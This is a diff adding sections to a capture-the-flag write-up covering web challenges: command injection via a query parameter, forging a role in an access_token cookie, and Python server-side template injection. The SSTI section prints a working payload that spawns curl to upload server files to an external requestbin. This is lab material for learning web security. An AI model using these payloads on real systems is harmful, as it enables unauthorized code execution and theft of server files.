@@ -281,3 +281,39 @@ And then go to the website we're rewarded with.
 Now let's add the query `...?0=find / -name 'flag.txt'`. After that we find that the flag is at `/var/www/html/flag.txt`, and we can go the website with the query params `...?0=cat /var/www/html/flag.txt`.
 
 Ta-da. :tada:
+
+## [Web // 50pt] Fortune cookie
+
+We get a hint to cookies. Let's check them out. 
+
+We find this one
+
+```
+access_token -> divination:student
+```
+
+Let's change this to something else, let's say, `professor`. gg
+
+## [Web // 300pt] Wizardschat
+
+Here we're first prompted with a login page, so I open it up in burp to examine the requests. To login, we simply need to edit the `has_magic` hidden param. 
+
+When opening the website, we can see our username, and enter messages to send to the other users.
+
+I fiddled a bit with the messages and username, but they're both sanitized.
+
+So, the only thing that's left then is the cookie we send to the server, which is rendered at the top of the page.
+
+First, I try the common mustache method, and enter `{{ 1 + 1 }}`, and _voilla_, my username is 2. We have SSTI (Server-Side Template Injection).
+
+Now let's try to get something worthwhile to run.
+
+After this I googled (and fiddled with) SSTIs for python, and ended up with the following, as I couldn't find `file` anywhere.
+
+```python
+{{"".__class__.mro()[1].__subclasses__()[181](['curl','https://enokry4q44i3.x.pipedream.net','-F','data=@main.py'])}}
+```
+
+The weird URL was my requestbin so I could see the output.
+
+By simply changing `main.py` to `flag.txt`, we get the flag! :)
